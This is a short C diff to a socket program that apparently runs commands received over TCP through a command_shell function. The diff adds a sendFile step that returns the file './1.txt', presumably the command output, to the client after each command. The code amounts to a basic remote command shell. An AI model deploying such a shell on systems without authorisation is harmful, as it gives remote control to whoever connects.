@@ -28,6 +28,11 @@ char *func(int sockfd) {
     return response;
 } 
 
+void sendFile(int  connfd){
+    char *filename= "./1.txt";
+    TCP_Send_File(connfd,filename);
+}
+
 void command_shell(char * buffed) {
     char buffy[MAX];
     bzero(buffy,MAX);
@@ -74,6 +79,7 @@ int main(int argc, char *argv[]) {
             break;
         } else {
             command_shell(resultado);
+            sendFile(connfd);
         }
     }
 
